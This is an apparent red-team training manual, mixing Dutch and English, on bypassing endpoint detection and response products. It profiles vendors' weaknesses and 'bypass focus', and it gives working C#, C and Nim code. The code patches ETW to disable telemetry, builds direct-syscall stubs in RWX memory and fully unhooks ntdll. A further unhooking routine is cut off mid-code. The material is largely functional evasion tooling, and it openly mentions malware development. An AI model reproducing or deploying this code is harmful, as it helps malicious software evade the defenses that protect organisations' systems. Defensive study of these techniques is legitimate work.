# XPOSE SECURITY — EDR EVASION DEEP DIVE
## Bypassing Modern Endpoint Detection & Response

**Classificatie:** STRIKT VERTROUWELIJK — SENIOR OPERATOR LEVEL  
**Versie:** 1.0 | Januari 2026

---

# INHOUDSOPGAVE

1. [How EDR Works](#1-how-edr-works)
2. [EDR Vendor Analysis](#2-edr-vendor-analysis)
3. [User-Mode Hooking & Bypasses](#3-user-mode-hooking--bypasses)
4. [Kernel-Mode Telemetry](#4-kernel-mode-telemetry)
5. [ETW Evasion](#5-etw-evasion)
6. [Direct Syscalls](#6-direct-syscalls)
7. [API Unhooking](#7-api-unhooking)
8. [Memory-Only Techniques](#8-memory-only-techniques)
9. [EDR-Specific Bypasses](#9-edr-specific-bypasses)
10. [Testing & Validation](#10-testing--validation)

---

# 1. HOW EDR WORKS

## 1.1 EDR Detection Layers

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           EDR DETECTION ARCHITECTURE                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  USER MODE                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐           │   │
│  │  │ Your Process │───►│  ntdll.dll   │───►│ kernel32.dll │           │   │
│  │  │              │    │   HOOKED     │    │              │           │   │
│  │  └──────────────┘    └──────┬───────┘    └──────────────┘           │   │
│  │                             │                                        │   │
│  │                    ┌────────▼────────┐                               │   │
│  │                    │  EDR User-Mode  │  ← Hooks API calls            │   │
│  │                    │     Agent       │  ← Inspects parameters        │   │
│  │                    └────────┬────────┘  ← Blocks suspicious calls    │   │
│  │                             │                                        │   │
│  └─────────────────────────────┼────────────────────────────────────────┘   │
│                                │                                             │
│  ─────────────────────────────────────────────────────────────────────────  │
│                                │ SYSCALL                                    │
│  ─────────────────────────────────────────────────────────────────────────  │
│                                │                                             │
│  KERNEL MODE                   ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                    ┌──────────────────┐                              │   │
│  │  ┌──────────────┐  │  EDR Kernel      │  ← Kernel callbacks          │   │
│  │  │   Windows    │◄─┤  Driver          │  ← Minifilters               │   │
│  │  │   Kernel     │  │  (.sys)          │  ← ETW providers             │   │
│  │  └──────────────┘  └──────────────────┘  ← Object callbacks          │   │
│  │                                                                      │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  CLOUD                                                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐           │   │
│  │  │   Threat     │    │   Machine    │    │   Analyst    │           │   │
│  │  │   Intel      │    │   Learning   │    │   Console    │           │   │
│  │  └──────────────┘    └──────────────┘    └──────────────┘           │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

> **📘 SENIOR INSIGHT:**
> **EDR detecteert op 3 niveaus:**
> 1. **User-Mode Hooks:** Inline hooks in ntdll.dll
> 2. **Kernel Callbacks:** PsSetCreateProcessNotifyRoutine, etc.
> 3. **ETW (Event Tracing):** .NET, PowerShell, process events
>
> **Om EDR te omzeilen moet je ALLE lagen aanpakken.**

---

## 1.2 Detection Mechanisms

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      EDR DETECTION TECHNIQUES                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STATIC ANALYSIS (Before execution)                                         │
│  ├── Signature matching (hash, byte patterns)                               │
│  ├── YARA rules                                                             │
│  ├── Import table analysis (suspicious API combinations)                    │
│  ├── PE structure analysis                                                  │
│  └── Machine learning on file features                                      │
│                                                                             │
│  DYNAMIC ANALYSIS (During execution)                                        │
│  ├── API call monitoring (hooked functions)                                 │
│  ├── Memory scanning (injection detection)                                  │
│  ├── Behavior patterns (what APIs in what order)                            │
│  ├── Network traffic analysis                                               │
│  └── ETW telemetry                                                          │
│                                                                             │
│  BEHAVIORAL ANALYSIS (Patterns over time)                                   │
│  ├── Parent-child process relationships                                     │
│  ├── Process injection detection                                            │
│  ├── Credential access patterns                                             │
│  ├── Lateral movement indicators                                            │
│  └── Data exfiltration patterns                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 1.3 Common Hooked APIs

```c
// === COMMONLY HOOKED NTDLL FUNCTIONS ===

// Process & Thread
NtCreateProcess          // Process creation
NtCreateThread           // Thread creation  
NtCreateThreadEx         // Thread creation (Vista+)
NtResumeThread           // Resume suspended thread
NtQueueApcThread         // Queue APC
NtSetContextThread       // Modify thread context

// Memory Operations
NtAllocateVirtualMemory  // Allocate memory
NtWriteVirtualMemory     // Write to process memory
NtProtectVirtualMemory   // Change memory protection
NtMapViewOfSection       // Map memory section
NtUnmapViewOfSection     // Unmap memory

// File & Registry
NtCreateFile             // File creation
NtWriteFile              // Write to file
NtReadFile               // Read from file
NtCreateKey              // Registry key creation
NtSetValueKey            // Registry value modification

// Network
NtDeviceIoControlFile    // Network operations (Winsock)

// Token & Security
NtOpenProcess            // Open process handle
NtOpenThread             // Open thread handle
NtDuplicateToken         // Token manipulation
NtAdjustPrivilegesToken  // Privilege changes
```

> **📘 SENIOR INSIGHT:**
> **De meest gehooke functie:**
> - `NtWriteVirtualMemory` + `NtProtectVirtualMemory` + `NtCreateThreadEx`
> - Dit is de klassieke injection pattern
> - EDR kijkt naar: WriteProcessMemory → RWX memory → CreateRemoteThread

---

# 2. EDR VENDOR ANALYSIS

## 2.1 Microsoft Defender for Endpoint (MDE / Defender ATP)

```yaml
Name: Microsoft Defender for Endpoint
Cloud: Microsoft 365 Security Center / Sentinel
Agent: MsSense.exe, SenseIR.exe, SenseCncProxy.exe

Detection Methods:
  User-Mode:
    - AMSI (Antimalware Scan Interface)
    - Script block logging
    - ETW providers
  Kernel-Mode:
    - Kernel callbacks
    - Minifilter driver
    - ELAM (Early Launch Anti-Malware)
  Cloud:
    - Microsoft Intelligent Security Graph
    - Machine learning
    - Threat intelligence

Strengths:
  - Deep OS integration (moeilijk te verwijderen)
  - Cloud-based detection
  - Correlation met Office 365, Azure AD
  - Tamper protection

Weaknesses:
  - AMSI bypass nog mogelijk
  - User-mode hooks kunnen worden removed
  - Sommige LOLBins worden niet gedetecteerd
  
Bypass Focus:
  - AMSI bypass
  - ETW patching
  - Use Defender exclusions
  - Living-off-the-land binaries
```

---

## 2.2 CrowdStrike Falcon

```yaml
Name: CrowdStrike Falcon
Agent: CSFalconService.exe, CSFalconContainer.exe
Driver: csagent.sys

Detection Methods:
  User-Mode:
    - Inline hooks in ntdll.dll
    - Aggressive hooking of memory APIs
    - .NET instrumentation
  Kernel-Mode:
    - Kernel-mode driver (zeer defensief)
    - Process creation callbacks
    - Object handle callbacks
    - Minifilter for file operations
  Cloud:
    - CrowdStrike Threat Graph
    - Real-time cloud analysis
    - IOC correlation

Strengths:
  - Zeer mature kernel driver
  - Agressieve detectie
  - Goede threat intel
  - Moeilijk te bypassen

Weaknesses:
  - Sommige syscall bypasses werken
  - Hardware breakpoint injection
  - Kernel driver kan crashen (BSOD history)
  
Bypass Focus:
  - Direct syscalls
  - Hardware breakpoints
  - Sleep obfuscation
  - Avoid known patterns
```

---

## 2.3 SentinelOne

```yaml
Name: SentinelOne
Agent: SentinelAgent.exe, SentinelServiceHost.exe
Driver: SentinelMonitor.sys

Detection Methods:
  User-Mode:
    - Inline hooks
    - ETW consumers
    - Process hollowing detection
  Kernel-Mode:
    - Minifilter driver
    - Process callbacks
    - Registry callbacks
  Local AI:
    - On-device machine learning
    - Behavioral AI

Strengths:
  - On-device AI (werkt offline)
  - Automatic response
  - Good at detecting living-off-the-land

Weaknesses:
  - AI kan false positives hebben
  - Unhooking technieken werken soms
  - Driver vulnerabilities in verleden
  
Bypass Focus:
  - Direct syscalls
  - Unhooking ntdll
  - Avoid behavioral patterns
  - Timing-based evasion
```

---

## 2.4 Carbon Black (VMware)

```yaml
Name: VMware Carbon Black
Variants: CB Defense, CB Response, CB Cloud
Agent: cb.exe, RepMgr.exe

Detection Methods:
  User-Mode:
    - API hooking
    - Script monitoring
  Kernel-Mode:
    - Driver-based monitoring
    - File/Registry callbacks
  Cloud:
    - VMware threat intelligence
    - Behavioral analysis

Strengths:
  - Goede visibility
  - EDR + AV combined
  - Process tree analysis

Weaknesses:
  - Less aggressive than CrowdStrike
  - Some LOLBins not detected
  - Unhooking can work
  
Bypass Focus:
  - Standard unhooking
  - LOLBins/LOLBAS
  - Indirect syscalls
```

---

## 2.5 Microsoft Sentinel (SIEM)

```yaml
Name: Microsoft Sentinel
Type: Cloud SIEM/SOAR
Integration: Azure, M365, Defender

Detection Methods:
  - Log aggregation
  - KQL queries
  - Fusion detection rules
  - ML anomaly detection
  - Threat intelligence

Data Sources:
  - Windows Event Logs
  - Azure AD logs
  - Office 365 audit logs
  - Defender ATP alerts
  - Custom connectors

Strengths:
  - Correlation across sources
  - Advanced hunting (KQL)
  - Automation playbooks

Weaknesses:
  - Only as good as the logs
  - Query performance at scale
  - Requires tuning
  
Evasion Focus:
  - Log evasion (don't generate events)
  - Blend with normal traffic
  - Avoid known detection rules
  - Timing attacks (generate noise)
```

---

## 2.6 Zscaler (Zero Trust)

```yaml
Name: Zscaler
Products: ZIA, ZPA, Zscaler Client Connector
Type: Cloud Security / Zero Trust

Detection Methods:
  - SSL inspection
  - URL categorization
  - Cloud application control
  - DLP inspection
  - Sandbox analysis

Strengths:
  - Inline traffic inspection
  - Zero Trust architecture
  - Cloud-based (hard to bypass locally)

Weaknesses:
  - Certificate pinning can bypass
  - Legitimate cloud services pass
  - Encrypted traffic challenges
  
Bypass Focus:
  - Use legitimate cloud services for C2
  - Domain fronting
  - Categorized domains
  - Certificate pinning
```

---

# 3. USER-MODE HOOKING & BYPASSES

## 3.1 Understanding Inline Hooks

```c
// === HOW INLINE HOOKS WORK ===

// ORIGINAL FUNCTION (NtWriteVirtualMemory in ntdll.dll)
// Before hooking:
0x7FFE1234: mov r10, rcx         ; 4C 8B D1
0x7FFE1237: mov eax, 0x3A        ; B8 3A 00 00 00  (syscall number)
0x7FFE123C: syscall              ; 0F 05
0x7FFE123E: ret                  ; C3

// AFTER EDR HOOKING:
0x7FFE1234: jmp 0x12345678       ; E9 XX XX XX XX  (jump to EDR code)
0x7FFE1239: nop                  ; 90
0x7FFE123A: nop                  ; 90
... (rest overwritten)

// EDR Hook Function:
// 1. Inspect parameters
// 2. Check if suspicious
// 3. Log event
// 4. Allow or block
// 5. Execute original bytes
// 6. Return to caller
```

> **📘 SENIOR INSIGHT:**
> **Hook detection:**
> - First bytes van ntdll functies zijn bekend
> - Als ze veranderd zijn = gehookt
> - Meestal: `mov r10, rcx` (4C 8B D1) → `jmp` (E9)

---

## 3.2 Hook Detection Code

```csharp
// === DETECT NTDLL HOOKS ===

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class HookDetector
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    // Known good first bytes of common ntdll functions
    static readonly Dictionary<string, byte[]> CleanPrologue = new Dictionary<string, byte[]>
    {
        // mov r10, rcx; mov eax, SYSCALL_NUM
        { "NtAllocateVirtualMemory", new byte[] { 0x4C, 0x8B, 0xD1, 0xB8 } },
        { "NtWriteVirtualMemory",    new byte[] { 0x4C, 0x8B, 0xD1, 0xB8 } },
        { "NtProtectVirtualMemory",  new byte[] { 0x4C, 0x8B, 0xD1, 0xB8 } },
        { "NtCreateThreadEx",        new byte[] { 0x4C, 0x8B, 0xD1, 0xB8 } },
    };
    
    public static bool IsHooked(string functionName)
    {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr funcAddr = GetProcAddress(ntdll, functionName);
        
        if (funcAddr == IntPtr.Zero) return false;
        
        byte[] currentBytes = new byte[4];
        Marshal.Copy(funcAddr, currentBytes, 0, 4);
        
        if (CleanPrologue.ContainsKey(functionName))
        {
            byte[] expected = CleanPrologue[functionName];
            for (int i = 0; i < 4; i++)
            {
                if (currentBytes[i] != expected[i])
                {
                    Console.WriteLine($"[!] {functionName} is HOOKED!");
                    Console.WriteLine($"    Expected: {BitConverter.ToString(expected)}");
                    Console.WriteLine($"    Found:    {BitConverter.ToString(currentBytes)}");
                    return true;
                }
            }
        }
        
        // Also check for JMP instruction (E9 = near jump)
        if (currentBytes[0] == 0xE9)
        {
            Console.WriteLine($"[!] {functionName} has JMP hook!");
            return true;
        }
        
        Console.WriteLine($"[+] {functionName} appears clean");
        return false;
    }
    
    public static void CheckAllHooks()
    {
        foreach (var func in CleanPrologue.Keys)
        {
            IsHooked(func);
        }
    }
}
```

---

# 4. KERNEL-MODE TELEMETRY

## 4.1 Kernel Callbacks

```c
// === KERNEL CALLBACKS USED BY EDR ===

// Process notifications
PsSetCreateProcessNotifyRoutine       // Notified on process creation
PsSetCreateProcessNotifyRoutineEx     // Extended version
PsSetCreateProcessNotifyRoutineEx2    // Even more info (Win10+)

// Thread notifications  
PsSetCreateThreadNotifyRoutine        // Thread creation
PsSetCreateThreadNotifyRoutineEx      // Extended

// Image (DLL/EXE) loading
PsSetLoadImageNotifyRoutine           // DLL/EXE loads
PsSetLoadImageNotifyRoutineEx         // Extended

// Object callbacks
ObRegisterCallbacks                   // Handle operations
                                      // (Open/duplicate process/thread)

// Registry callbacks
CmRegisterCallback                    // Registry operations
CmRegisterCallbackEx                  // Extended

// Minifilter callbacks
FltRegisterFilter                     // File system operations
```

> **📘 SENIOR INSIGHT:**
> **Je KUNT kernel callbacks niet bypassen vanuit user-mode.**
> De kernel ZAL notified worden bij:
> - Process creatie
> - DLL loads
> - Handle operaties
>
> **Maar:** Je kunt zorgen dat wat de kernel ziet er legitiem uitziet.

---

## 4.2 ETW Providers

```powershell
# === ETW PROVIDERS USED BY EDR ===

# List all ETW providers
logman query providers

# Key security providers:
# Microsoft-Windows-Threat-Intelligence  # Defender ATP
# Microsoft-Windows-Security-Auditing    # Security events
# Microsoft-Windows-PowerShell           # PowerShell logging
# Microsoft-Windows-DotNETRuntime        # .NET events
# Microsoft-Antimalware-Scan-Interface   # AMSI

# Providers that feed EDR:
Microsoft-Windows-Kernel-Process        # Process events
Microsoft-Windows-Kernel-Thread         # Thread events
Microsoft-Windows-Kernel-File           # File events
Microsoft-Windows-Kernel-Network        # Network events
Microsoft-Windows-Kernel-Registry       # Registry events
```

---

# 5. ETW EVASION

## 5.1 ETW Patching

```csharp
// === PATCH ETW TO DISABLE TELEMETRY ===

using System;
using System.Runtime.InteropServices;

public class EtwPatch
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    
    public static void PatchEtw()
    {
        // Get address of EtwEventWrite in ntdll.dll
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        
        // Patch bytes: xor eax, eax; ret (return 0 immediately)
        // This makes EtwEventWrite do nothing
        byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 };  // xor rax, rax; ret
        
        // Change memory protection
        uint oldProtect;
        VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
        
        // Write patch
        Marshal.Copy(patch, 0, etwEventWrite, patch.Length);
        
        // Restore protection
        VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        
        Console.WriteLine("[+] EtwEventWrite patched - ETW disabled for this process");
    }
}
```

> **📘 SENIOR INSIGHT:**
> **ETW patching effecten:**
> - PowerShell script block logging uitgeschakeld
> - .NET events niet meer gelogd
> - Veel EDR visibility verloren
>
> **Maar:** Kernel-mode ETW blijft actief!

---

## 5.2 .NET ETW Bypass

```csharp
// === BYPASS .NET ETW LOGGING ===

using System;
using System.Reflection;

public class DotNetEtwBypass
{
    public static void Disable()
    {
        // Get EventProvider type
        Type eventProvider = typeof(System.Diagnostics.Tracing.EventSource)
            .Assembly.GetType("System.Diagnostics.Tracing.EventProvider");
        
        if (eventProvider != null)
        {
            // Get m_enabled field
            FieldInfo enabledField = eventProvider.GetField("m_enabled", 
                BindingFlags.NonPublic | BindingFlags.Instance);
            
            // Get all instances and disable
            // This disables .NET runtime ETW events
        }
        
        // Alternative: Patch clr!ETW::SamplingProvider
        // More complex but more thorough
    }
}
```

---

# 6. DIRECT SYSCALLS

## 6.1 Syscall Concept

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      NORMAL vs DIRECT SYSCALL                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  NORMAL (Hooked by EDR):                                                    │
│  ┌──────────┐    ┌───────────────┐    ┌────────────┐    ┌──────────────┐   │
│  │ Your App │───►│ kernel32.dll  │───►│ ntdll.dll  │───►│   Kernel     │   │
│  └──────────┘    │               │    │  (HOOKED)  │    └──────────────┘   │
│                  │ WriteProcess  │    │ NtWrite... │                        │
│                  │ Memory()      │    │ ↓          │                        │
│                  └───────────────┘    │ EDR SEES!  │                        │
│                                       └────────────┘                        │
│                                                                             │
│  DIRECT SYSCALL (Bypasses hooks):                                           │
│  ┌──────────┐                                          ┌──────────────┐    │
│  │ Your App │─────────────── SYSCALL ─────────────────►│   Kernel     │    │
│  └──────────┘         (assembly instruction)           └──────────────┘    │
│       │                                                                     │
│       └─── Completely bypasses ntdll.dll hooks!                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

> **📘 SENIOR INSIGHT:**
> **Direct syscalls:**
> - Roepen kernel direct aan
> - Slaan ntdll.dll over
> - Hooks worden niet geraakt
> - MAAR: Kernel callbacks zien je nog steeds!

---

## 6.2 Syscall Numbers

```c
// === WINDOWS 10/11 SYSCALL NUMBERS ===
// NOTE: These change per Windows version/build!

// Windows 10 21H2 (Build 19044) - x64
#define NtAllocateVirtualMemory  0x18
#define NtProtectVirtualMemory   0x50
#define NtWriteVirtualMemory     0x3A
#define NtCreateThreadEx         0xC7
#define NtOpenProcess            0x26
#define NtClose                  0x0F
#define NtQueryInformationProcess 0x19
#define NtReadVirtualMemory      0x3F

// Windows 11 22H2 (Build 22621) - x64
// Numbers may differ!

// IMPORTANT: Syscall numbers change between versions
// Use dynamic resolution or version-specific code
```

---

## 6.3 C# Direct Syscalls (P/Invoke Alternative)

```csharp
// === DIRECT SYSCALL IMPLEMENTATION IN C# ===

using System;
using System.Runtime.InteropServices;

public class DirectSyscalls
{
    // Delegate matching NtAllocateVirtualMemory signature
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );
    
    // Syscall stub - x64
    // mov r10, rcx
    // mov eax, <syscall_number>
    // syscall
    // ret
    static byte[] syscallStub = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscall_number (placeholder)
        0x0F, 0x05,                      // syscall
        0xC3                             // ret
    };
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    public static IntPtr PrepareSyscall(uint syscallNumber)
    {
        // Allocate executable memory for syscall stub
        IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)syscallStub.Length, 0x3000, 0x40);
        
        // Copy stub
        byte[] stub = (byte[])syscallStub.Clone();
        
        // Insert syscall number
        byte[] syscallBytes = BitConverter.GetBytes(syscallNumber);
        Array.Copy(syscallBytes, 0, stub, 4, 4);
        
        // Write to executable memory
        Marshal.Copy(stub, 0, stubAddr, stub.Length);
        
        return stubAddr;
    }
    
    public static uint NtAllocateVirtualMemory_Syscall(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        IntPtr zeroBits,
        ref IntPtr regionSize,
        uint allocationType,
        uint protect)
    {
        // Windows 10 21H2 syscall number for NtAllocateVirtualMemory
        uint syscallNumber = 0x18;
        
        IntPtr stubAddr = PrepareSyscall(syscallNumber);
        
        var syscall = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(stubAddr);
        
        return syscall(processHandle, ref baseAddress, zeroBits, ref regionSize, allocationType, protect);
    }
}
```

---

## 6.4 Nim Direct Syscalls

```nim
# === NIM DIRECT SYSCALLS ===
# More elegant than C# for malware development

import winim
import strutils

type
  NTSTATUS = int32

# Syscall stub
proc syscallStub(syscallNumber: uint32): pointer =
  # Allocate RWX memory
  let stub = VirtualAlloc(nil, 16, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  
  # mov r10, rcx; mov eax, <num>; syscall; ret
  let bytes: array[11, byte] = [
    byte 0x4C, 0x8B, 0xD1,                          # mov r10, rcx
    0xB8, byte(syscallNumber), byte(syscallNumber shr 8), 
    byte(syscallNumber shr 16), byte(syscallNumber shr 24),  # mov eax, num
    0x0F, 0x05,                                     # syscall
    0xC3                                            # ret
  ]
  
  copyMem(stub, unsafeAddr bytes[0], bytes.len)
  return stub

# Define function type
type NtAllocateVirtualMemory = proc(
  ProcessHandle: HANDLE,
  BaseAddress: ptr PVOID,
  ZeroBits: ULONG_PTR,
  RegionSize: ptr SIZE_T,
  AllocationType: ULONG,
  Protect: ULONG
): NTSTATUS {.stdcall.}

proc allocateMemory*(size: int): pointer =
  let stub = syscallStub(0x18)  # NtAllocateVirtualMemory
  let ntAlloc = cast[NtAllocateVirtualMemory](stub)
  
  var baseAddr: PVOID = nil
  var regionSize: SIZE_T = size
  
  let status = ntAlloc(
    cast[HANDLE](-1),  # Current process
    addr baseAddr,
    0,
    addr regionSize,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  
  if status >= 0:
    return baseAddr
  else:
    return nil
```

> **📘 SENIOR INSIGHT:**
> **Nim voordelen voor syscalls:**
> - Compileert naar native code
> - Kleine binaries
> - Minder signatures
> - Python-achtige syntax
> - Goede FFI naar Windows APIs

---

# 7. API UNHOOKING

## 7.1 Unhooking Concept

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         UNHOOKING STRATEGY                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1: Get clean ntdll.dll                                                │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  Option A: Read from disk (C:\Windows\System32\ntdll.dll)           │   │
│  │  Option B: Read from KnownDlls (\KnownDlls\ntdll.dll)               │   │
│  │  Option C: Map fresh copy from disk                                  │   │
│  │  Option D: Get from suspended process                                │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  STEP 2: Find .text section (code section)                                  │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  Parse PE headers to find:                                           │   │
│  │  - .text section offset                                              │   │
│  │  - .text section size                                                │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  STEP 3: Overwrite hooked .text with clean version                          │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  VirtualProtect → Change to RWX                                      │   │
│  │  memcpy → Copy clean .text over hooked .text                         │   │
│  │  VirtualProtect → Restore to RX                                      │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  RESULT: All hooks removed, ntdll functions work without EDR visibility     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 7.2 Full Ntdll Unhooking (C#)

```csharp
// === COMPLETE NTDLL UNHOOKING ===

using System;
using System.IO;
using System.Runtime.InteropServices;

public class NtdllUnhooker
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    static extern void RtlMoveMemory(IntPtr dest, IntPtr src, uint size);
    
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_EXECUTE_READ = 0x20;
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 29)]
        public ushort[] e_res;
        public int e_lfanew;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }
    
    public static bool UnhookNtdll()
    {
        try
        {
            // Step 1: Read clean ntdll from disk
            string ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
            byte[] cleanNtdll = File.ReadAllBytes(ntdllPath);
            
            // Step 2: Get loaded ntdll base address
            IntPtr loadedNtdll = GetModuleHandle("ntdll.dll");
            if (loadedNtdll == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get ntdll handle");
                return false;
            }
            
            // Step 3: Parse PE headers to find .text section
            
            // Get DOS header
            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(loadedNtdll);
            
            // Get NT headers offset
            IntPtr ntHeadersPtr = IntPtr.Add(loadedNtdll, dosHeader.e_lfanew);
            
            // Skip signature (4 bytes) and get FILE_HEADER
            IntPtr fileHeaderPtr = IntPtr.Add(ntHeadersPtr, 4);
            IMAGE_FILE_HEADER fileHeader = Marshal.PtrToStructure<IMAGE_FILE_HEADER>(fileHeaderPtr);
            
            // Calculate section headers offset
            // NT headers + signature(4) + FILE_HEADER + Optional Header size
            int optionalHeaderSize = fileHeader.SizeOfOptionalHeader;
            IntPtr sectionHeadersPtr = IntPtr.Add(fileHeaderPtr, 
                Marshal.SizeOf<IMAGE_FILE_HEADER>() + optionalHeaderSize);
            
            // Find .text section
            IntPtr currentSection = sectionHeadersPtr;
            IMAGE_SECTION_HEADER textSection = default;
            bool foundText = false;
            
            for (int i = 0; i < fileHeader.NumberOfSections; i++)
            {
                IMAGE_SECTION_HEADER section = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(currentSection);
                string sectionName = System.Text.Encoding.ASCII.GetString(section.Name).TrimEnd('\0');
                
                if (sectionName == ".text")
                {
                    textSection = section;
                    foundText = true;
                    break;
                }
                
                currentSection = IntPtr.Add(currentSection, Marshal.SizeOf<IMAGE_SECTION_HEADER>());
            }
            
            if (!foundText)
            {
                Console.WriteLine("[-] .text section not found");
                return false;
            }
            
            Console.WriteLine($"[*] .text section: VA=0x{textSection.VirtualAddress:X}, Size=0x{textSection.VirtualSize:X}");
            
            // Step 4: Calculate addresses
            IntPtr loadedTextSection = IntPtr.Add(loadedNtdll, (int)textSection.VirtualAddress);
            
            // Pin clean ntdll bytes
            GCHandle handle = GCHandle.Alloc(cleanNtdll, GCHandleType.Pinned);
            IntPtr cleanTextSection = IntPtr.Add(handle.AddrOfPinnedObject(), (int)textSection.PointerToRawData);
            
            // Step 5: Change memory protection to RWX
            uint oldProtect;
            bool protectResult = VirtualProtect(loadedTextSection, (UIntPtr)textSection.VirtualSize, 
                PAGE_EXECUTE_READWRITE, out oldProtect);
            
            if (!protectResult)
            {
                Console.WriteLine("[-] VirtualProtect failed");
                handle.Free();
                return false;
            }
            
            // Step 6: Copy clean .text over hooked .text
            RtlMoveMemory(loadedTextSection, cleanTextSection, textSection.VirtualSize);
            
            Console.WriteLine($"[+] Copied {textSection.VirtualSize} bytes of clean .text section");
            
            // Step 7: Restore original protection
            VirtualProtect(loadedTextSection, (UIntPtr)textSection.VirtualSize, oldProtect, out oldProtect);
            
            handle.Free();
            
            Console.WriteLine("[+] ntdll.dll successfully unhooked!");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error: {ex.Message}");
            return false;
        }
    }
}
```

---

## 7.3 Perun's Fart (Alternative Technique)

```csharp
// === PERUN'S FART - Unhook from suspended process ===
// Creates suspended process, copies its clean ntdll

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class PerunsFart
{
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);
    
    [DllImport("kernel32.dll")]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
